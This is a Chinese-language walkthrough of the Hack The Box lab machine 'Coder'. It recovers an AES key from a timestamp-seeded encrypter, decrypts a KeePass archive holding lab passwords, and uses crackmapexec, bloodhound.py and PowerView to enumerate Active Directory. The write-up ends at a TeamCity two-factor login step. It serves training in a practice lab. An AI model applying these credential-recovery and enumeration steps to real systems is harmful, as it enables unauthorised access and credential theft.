<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls</span></span><br><span class="line">drw-rw-rw-          0  Thu Nov  3 12:17:13 2022 .</span><br><span class="line">drw-rw-rw-          0  Thu Nov  3 12:17:13 2022 ..</span><br><span class="line">drw-rw-rw-          0  Tue Nov  8 17:11:25 2022 Migrations</span><br><span class="line">drw-rw-rw-          0  Fri Nov 11 17:19:03 2022 Temporary Projects</span><br></pre></td></tr></table></figure>

<p>首先是第一个 <code>Migrations</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls</span></span><br><span class="line">drw-rw-rw-          0  Tue Nov  8 17:11:25 2022 .</span><br><span class="line">drw-rw-rw-          0  Tue Nov  8 17:11:25 2022 ..</span><br><span class="line">drw-rw-rw-          0  Tue Nov  8 17:11:25 2022 adcs_reporting</span><br><span class="line">drw-rw-rw-          0  Thu Nov  3 12:17:13 2022 bootstrap-template-master</span><br><span class="line">drw-rw-rw-          0  Thu Nov  3 12:17:13 2022 Cachet-2.4</span><br><span class="line">drw-rw-rw-          0  Thu Nov  3 12:17:13 2022 kimchi-master</span><br><span class="line">drw-rw-rw-          0  Fri Nov  4 15:14:54 2022 teamcity_test_repo</span><br></pre></td></tr></table></figure>


<p><code>adcs_reporting</code> 中包含一个脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ls</span><br><span class="line">drw-rw-rw-          0  Tue Nov  8 17:11:25 2022 .</span><br><span class="line">drw-rw-rw-          0  Tue Nov  8 17:11:25 2022 ..</span><br><span class="line">drw-rw-rw-          0  Tue Nov  8 17:11:25 2022 .git</span><br><span class="line">-rw-rw-rw-       7245  Tue Nov  8 16:19:41 2022 Get-ADCS_Report.ps1</span><br></pre></td></tr></table></figure>

<p>脚本中比较重点的部分如下，这个脚本大致功能是由pkiadmins 向 itsupport 发邮件用的，其中有个用户名为<code>e.black</code> </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Send mail function</span></span><br><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">script</span>:<span class="title">send_mail</span></span> &#123;</span><br><span class="line"></span><br><span class="line">  [<span class="type">CmdletBinding</span>()]</span><br><span class="line">  <span class="keyword">param</span></span><br><span class="line">  (</span><br><span class="line">    [<span class="built_in">string</span>]</span><br><span class="line">    <span class="variable">$message</span>,</span><br><span class="line"></span><br><span class="line">    [<span class="built_in">string</span>]</span><br><span class="line">    <span class="variable">$subject</span></span><br><span class="line">  )              </span><br><span class="line"><span class="variable">$emailFrom</span> = <span class="string">&#x27;pkiadmins@coder.htb&#x27;</span></span><br><span class="line"><span class="variable">$emailCC</span> = <span class="string">&#x27;e.black@coder.htb&#x27;</span></span><br><span class="line"><span class="variable">$emailTo</span> = <span class="string">&#x27;itsupport@coder.htb&#x27;</span></span><br><span class="line"><span class="variable">$smtpServer</span> = <span class="string">&#x27;smtp.coder.htb&#x27;</span></span><br><span class="line"><span class="built_in">Send-MailMessage</span> <span class="literal">-SmtpServer</span> <span class="variable">$smtpServer</span> <span class="literal">-To</span> <span class="variable">$emailTo</span> <span class="literal">-Cc</span> <span class="variable">$emailCC</span> <span class="literal">-From</span> <span class="variable">$emailFrom</span> <span class="literal">-Subject</span> <span class="variable">$subject</span> <span class="literal">-Body</span> <span class="variable">$message</span> <span class="literal">-BodyAsHtml</span> <span class="literal">-Priority</span> High</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后在 teamcity_test_repo 中有一个脚本 <code>hello_world.ps1</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/Migrations/teamcity_test_repo</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">drw-rw-rw-          0  Fri Nov  4 15:14:54 2022 .</span><br><span class="line">drw-rw-rw-          0  Fri Nov  4 15:14:54 2022 ..</span><br><span class="line">drw-rw-rw-          0  Fri Nov  4 15:14:54 2022 .git</span><br><span class="line">-rw-rw-rw-         67  Fri Nov  4 15:12:08 2022 hello_world.ps1</span><br><span class="line"><span class="comment"># cat hello_world.ps1</span></span><br><span class="line"><span class="comment">#Simple repo test for Teamcity pipeline</span></span><br><span class="line">write-host <span class="string">&quot;Hello, World!&quot;</span></span><br></pre></td></tr></table></figure>

<p>然后是 <code>\Temporary Projects</code> 下由一个 <code>enc</code> 和一个 <code>exe</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># cd Temporary Projects</span><br><span class="line"># ls</span><br><span class="line">drw-rw-rw-          0  Fri Nov 11 17:19:03 2022 .</span><br><span class="line">drw-rw-rw-          0  Fri Nov 11 17:19:03 2022 ..</span><br><span class="line">-rw-rw-rw-       5632  Fri Nov  4 12:58:20 2022 Encrypter.exe</span><br><span class="line">-rw-rw-rw-       3808  Fri Nov 11 17:17:08 2022 s.blade.enc</span><br></pre></td></tr></table></figure>

<p>exe脱下来看了下，是.net的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ file Encrypter.exe       </span><br><span class="line">Encrypter.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections</span><br></pre></td></tr></table></figure>

<p><img src="https://image.baidu.com/search/down?url=http://tvax2.sinaimg.cn/mw690/0065CzJOly1i3bdhzs14hj31dc0r17oj.jpg" alt="image"></p>
<p>看起来是一个简单的时间戳seed加密，key和iv都是时间戳gen出来的</p>
<p>这里可以通过enc文件创建的时间来推出他的时间戳</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.blade.enc                         A     3808  Fri Nov 11 17:17:08 2022</span><br></pre></td></tr></table></figure>

<p>文件创建的时间戳是 <code>1668205028</code> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ date -d &quot;Fri Nov 11 17:17:08 2022&quot; +%s</span><br><span class="line">1668205028</span><br></pre></td></tr></table></figure>

<p>让ai写个解密</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"></span><br><span class="line"><span class="meta">#nullable disable</span></span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">AESDecrypt</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> encryptedFile = <span class="string">&quot;./s.blade.enc&quot;</span>;</span><br><span class="line">        <span class="built_in">string</span> outputFile = <span class="string">&quot;./s.blade&quot;</span>;</span><br><span class="line">        <span class="built_in">int</span> seed = <span class="number">1668205028</span>;</span><br><span class="line"></span><br><span class="line">        Random random = <span class="keyword">new</span> Random(seed);</span><br><span class="line">        <span class="built_in">byte</span>[] iv = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">16</span>];</span><br><span class="line">        <span class="built_in">byte</span>[] key = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">32</span>];</span><br><span class="line">        random.NextBytes(iv);</span><br><span class="line">        random.NextBytes(key);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            DecryptFile(encryptedFile, outputFile, key, iv);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;Decryption successful!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;Decryption failed: &quot;</span> + ex.Message);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">DecryptFile</span>(<span class="params"><span class="built_in">string</span> encryptedFile, <span class="built_in">string</span> outputFile, <span class="built_in">byte</span>[] Key, <span class="built_in">byte</span>[] IV</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">using</span> (RijndaelManaged rijndaelManaged = <span class="keyword">new</span> RijndaelManaged())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">using</span> (FileStream fileStream1 = <span class="keyword">new</span> FileStream(encryptedFile, FileMode.Open))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">using</span> (ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor(Key, IV))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">using</span> (CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(fileStream1, decryptor, CryptoStreamMode.Read))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">using</span> (FileStream fileStream2 = <span class="keyword">new</span> FileStream(outputFile, FileMode.Create))</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">byte</span>[] buffer = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                            <span class="built_in">int</span> count;</span><br><span class="line">                            <span class="keyword">while</span> ((count = cryptoStream.Read(buffer, <span class="number">0</span>, buffer.Length)) != <span class="number">0</span>)</span><br><span class="line">                            &#123;</span><br><span class="line">                                fileStream2.Write(buffer, <span class="number">0</span>, count);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解密后得到一个7z包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">└─$ 7z l s.blade</span><br><span class="line"></span><br><span class="line">7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29</span><br><span class="line"> 64-bit locale=C.UTF-8 Threads:128 OPEN_MAX:1024</span><br><span class="line"></span><br><span class="line">Scanning the drive <span class="keyword">for</span> archives:</span><br><span class="line">1 file, 3799 bytes (4 KiB)</span><br><span class="line"></span><br><span class="line">Listing archive: s.blade</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">Path = s.blade</span><br><span class="line">Type = 7z</span><br><span class="line">Physical Size = 3799</span><br><span class="line">Headers Size = 177</span><br><span class="line">Method = LZMA2:12</span><br><span class="line">Solid = -</span><br><span class="line">Blocks = 2</span><br><span class="line"></span><br><span class="line">   Date      Time    Attr         Size   Compressed  Name</span><br><span class="line">------------------- ----- ------------ ------------  ------------------------</span><br><span class="line">2022-11-03 16:02:30 ..H.A         1024         1028  .key</span><br><span class="line">2022-11-11 18:13:55 ....A         2590         2594  s.blade.kdbx</span><br><span class="line">------------------- ----- ------------ ------------  ------------------------</span><br><span class="line">2022-11-11 18:13:55               3614         3622  2 files</span><br></pre></td></tr></table></figure>

<p>包含一个keepass库和一个key，解压。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z x s.blade</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ tree -al</span><br><span class="line">.</span><br><span class="line">├── .key</span><br><span class="line">├── s.blade.enc</span><br><span class="line">└── s.blade.kdbx</span><br></pre></td></tr></table></figure>

<p><img src="https://image.baidu.com/search/down?url=http://tvax3.sinaimg.cn/mw690/0065CzJOly1i3bdjmfuk0j312f0kd78c.jpg" alt="image"></p>
<p>得到的密码库内存了仨值</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;6132e897-44a2-4d14-92d2-12954724e83f&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;encrypted&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hash&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6132e897-44a2-4d14-92d2-12954724e83f&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;totp&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;secret&quot;</span><span class="punctuation">:</span> <span class="string">&quot;U2FsdGVkX1+3JfFoKh56OgrH5jH0LLtc+34jzMBzE+QbqOBTXqKvyEEPKUyu13N2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;issuer&quot;</span><span class="punctuation">:</span> <span class="string">&quot;TeamCity&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;account&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s.blade&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;enc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;U2FsdGVkX19dvUpQDCRui5XaLDSbh9bP00/1iBSrKp7102OR2aRhHN0s4QHq/NmYwxadLeTN7Me1a3LrVJ+JkKd76lRCnd1utGp/Jv6w0hmcsqdhdccOpixnC3wAnqBp+5QyzPVaq24Z4L+Rx55HRUQVNLrkLgXpkULO20wYbQrJYN1D8nr3g/G0ukrmby+1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hash&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$argon2id$v=19$m=16384,t=1,p=1$L/vKleu5gFis+GLZbROCPw$OzW14DA0kdgIjCbo6MPDYoh+NEHnNCNV&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s.blade@coder.htb</span><br><span class="line"></span><br><span class="line">AmcwNO60Zg3vca3o0HDrTC6D</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://teamcity-dev.coder.htb</span><br><span class="line"></span><br><span class="line">s.blade</span><br><span class="line"></span><br><span class="line">veh5nUSZFFoqz9CrrhSeuwhA</span><br></pre></td></tr></table></figure>

<p>第一个不知道是什么的，第二个是域账户密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ crackmapexec smb dc01.coder.htb  -u s.blade -p AmcwNO60Zg3vca3o0HDrTC6D -d coder.htb --shares   </span><br><span class="line">SMB         dc01.coder.htb  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:coder.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         dc01.coder.htb  445    DC01             [+] coder.htb\s.blade:AmcwNO60Zg3vca3o0HDrTC6D </span><br><span class="line">SMB         dc01.coder.htb  445    DC01             [+] Enumerated shares</span><br><span class="line">SMB         dc01.coder.htb  445    DC01             Share           Permissions     Remark</span><br><span class="line">SMB         dc01.coder.htb  445    DC01             -----           -----------     ------</span><br><span class="line">SMB         dc01.coder.htb  445    DC01             ADMIN$                          Remote Admin</span><br><span class="line">SMB         dc01.coder.htb  445    DC01             C$                              Default share</span><br><span class="line">SMB         dc01.coder.htb  445    DC01             Development     READ            </span><br><span class="line">SMB         dc01.coder.htb  445    DC01             IPC$            READ            Remote IPC</span><br><span class="line">SMB         dc01.coder.htb  445    DC01             NETLOGON        READ            Logon server share </span><br><span class="line">SMB         dc01.coder.htb  445    DC01             SYSVOL          READ            Logon server share </span><br><span class="line">SMB         dc01.coder.htb  445    DC01             Users           READ </span><br></pre></td></tr></table></figure>

<p>第三个给了一个teamcity的url，加到host，先枚举域内信息之后再看。</p>
<h1 id="to-svc-teamcity"><a href="#to-svc-teamcity" class="headerlink" title="to svc_teamcity"></a>to svc_teamcity</h1><h3 id="bloodhound"><a href="#bloodhound" class="headerlink" title="bloodhound"></a>bloodhound</h3><p>遛狗</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">└─$ bloodhound.py -ns 10.10.11.207 --zip -dc dc01.coder.htb  -u s.blade -p AmcwNO60Zg3vca3o0HDrTC6D  -d coder.htb </span><br><span class="line">INFO: Found AD domain: coder.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">INFO: Connecting to LDAP server: dc01.coder.htb</span><br><span class="line">WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Found 10 <span class="built_in">users</span></span><br><span class="line">INFO: Connecting to LDAP server: dc01.coder.htb</span><br><span class="line">WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...</span><br><span class="line">INFO: Found 55 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: dc01.coder.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 49S</span><br><span class="line">INFO: Compressing output into 20250707130802_bloodhound.zip</span><br></pre></td></tr></table></figure>

<p>枚举 <code>s.blade</code> ,其属于 <code>Software Developers</code> 与 <code>BuildAgent Mgmt</code> 组</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PV &gt; <span class="built_in">Get-DomainUser</span> s.blade</span><br><span class="line">cn                                : Sonya Blade</span><br><span class="line">distinguishedName                 : CN=Sonya Blade,OU=Users,OU=Development,DC=coder,DC=htb</span><br><span class="line">memberOf                          : CN=BuildAgent Mgmt,OU=Groups,OU=Development,DC=coder,DC=htb</span><br><span class="line">                                    CN=Software Developers,OU=Groups,OU=Development,DC=coder,DC=htb</span><br><span class="line">name                              : Sonya Blade</span><br><span class="line">objectGUID                        : &#123;<span class="number">77</span>d893c9<span class="literal">-c681-4034-a700-ba7fbedde87a</span>&#125;</span><br><span class="line">userAccountControl                : NORMAL_ACCOUNT [<span class="number">66048</span>]</span><br><span class="line">                                    DONT_EXPIRE_PASSWORD</span><br><span class="line">badPwdCount                       : <span class="number">0</span></span><br><span class="line">badPasswordTime                   : <span class="number">01</span>/<span class="number">01</span>/<span class="number">1601</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> (<span class="number">424</span> years, <span class="number">6</span> months ago)</span><br><span class="line">lastLogoff                        : <span class="number">1601</span><span class="literal">-01-01</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>+<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">lastLogon                         : <span class="number">18</span>/<span class="number">02</span>/<span class="number">2023</span> <span class="number">01</span>:<span class="number">12</span>:<span class="number">30</span> (<span class="number">2</span> years, <span class="number">4</span> months ago)</span><br><span class="line">pwdLastSet                        : <span class="number">09</span>/<span class="number">11</span>/<span class="number">2022</span> <span class="number">17</span>:<span class="number">38</span>:<span class="number">59</span> (<span class="number">2</span> years, <span class="number">8</span> months ago)</span><br><span class="line">primaryGroupID                    : <span class="number">513</span></span><br><span class="line">objectSid                         : S<span class="literal">-1-5-21-2608251805-3526430372-1546376444-1110</span></span><br><span class="line">sAMAccountName                    : s.blade</span><br><span class="line">sAMAccountType                    : SAM_USER_OBJECT</span><br><span class="line">userPrincipalName                 : s.blade@coder.htb</span><br><span class="line">objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=coder,DC=htb</span><br></pre></td></tr></table></figure>

<p>枚举 <code>s.blade</code> 与 <code>Software Developers</code> 没有发现outbound权限，<code>BuildAgent Mgmt</code> 组存在对<code>BuildAgents</code> ou 的创建与删除账户以及修改属性的权限，或者把自己加进去。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PV &gt; <span class="built_in">Get-DomainObjectAcl</span>  <span class="literal">-SecurityIdentifier</span>  S<span class="literal">-1-5-21-2608251805-3526430372-1546376444-8601</span> <span class="literal">-ResolveGUIDs</span> </span><br><span class="line"></span><br><span class="line">ObjectDN                    : OU=BuildAgents,OU=Development,DC=coder,DC=htb</span><br><span class="line">ObjectSID                   : None</span><br><span class="line">ACEType                     : ACCESS_ALLOWED_OBJECT_ACE</span><br><span class="line">ACEFlags                    : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE</span><br><span class="line">AccessMask                  : ReadProperty, WriteProperty, Self</span><br><span class="line">ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT</span><br><span class="line">ObjectAceType               : DNS Host Name Attributes (<span class="number">72</span>e39547<span class="literal">-7b18-11d1-adef-00c04fd8d5cd</span>)</span><br><span class="line">InheritanceType             : UNKNOWN (bf967a86<span class="literal">-0de6-11d0-a285-00aa003049e2</span>)</span><br><span class="line">SecurityIdentifier          : BuildAgent Mgmt (S<span class="literal">-1-5-21-2608251805-3526430372-1546376444-8601</span>)</span><br><span class="line"></span><br><span class="line">ObjectDN                    : OU=BuildAgents,OU=Development,DC=coder,DC=htb</span><br><span class="line">ObjectSID                   : None</span><br><span class="line">ACEType                     : ACCESS_ALLOWED_OBJECT_ACE</span><br><span class="line">ACEFlags                    : CONTAINER_INHERIT_ACE</span><br><span class="line">AccessMask                  : CreateChild, DeleteChild</span><br><span class="line">ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT</span><br><span class="line">ObjectAceType               : UNKNOWN (bf967a86<span class="literal">-0de6-11d0-a285-00aa003049e2</span>)</span><br><span class="line">InheritanceType             : None</span><br><span class="line">SecurityIdentifier          : BuildAgent Mgmt (S<span class="literal">-1-5-21-2608251805-3526430372-1546376444-8601</span>)</span><br></pre></td></tr></table></figure>

<p>这里 <code>BuildAgents</code> ou没有bind gpo，所以暂时不知道这个组是做啥用的。</p>
<p>跑spn和npu没有收获，转而去看web部分</p>
<p>使用 <code>s.blade \ veh5nUSZFFoqz9CrrhSeuwhA</code> 账户登录web</p>
<p><img src="https://image.baidu.com/search/down?url=http://tvax2.sinaimg.cn/mw690/0065CzJOly1i3bdk0nxh0j31ax0q6wik.jpg" alt="image"></p>
<p>提示开了2FA 需要输入totp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Two-Factor Authentication</span><br><span class="line">Enter six-digit password from your authenticator app or one of the savedrecovery codes.</span><br></pre></td></tr></table></figure>

<p>这里提示说使用 <code>authenticator</code> app 生成的6位码</p>
<p>所以去装了一个</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://addons.mozilla.org/en-US/firefox/addon/auth-helper/">https://addons.mozilla.org/en-US/firefox/addon/auth-helper/</a></p>
</blockquote>
<p>但是研究不出来他给的密码如何导入</p>
<p><img src="https://image.baidu.com/search/down?url=http://tvax3.sinaimg.cn/mw690/0065CzJOly1i3bdk7ewymj30c90dvjrz.jpg" alt="image"></p>
<p>想不通，所以去翻 <a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2023/12/16/htb-coder.html#identify-application">0xdf 的wp</a>看这部分怎么走</p>
<p>从其中得知，被 <code>authenticator</code> 使用保护密码加密后的totp，在backup时便会以json的形式显示加密文件。</p>
<p>如下</p>
<p><img src="https://image.baidu.com/search/down?url=http://tvax3.sinaimg.cn/mw690/0065CzJOly1i3bdkgx1x0j30wv0e3ti9.jpg" alt="image"></p>
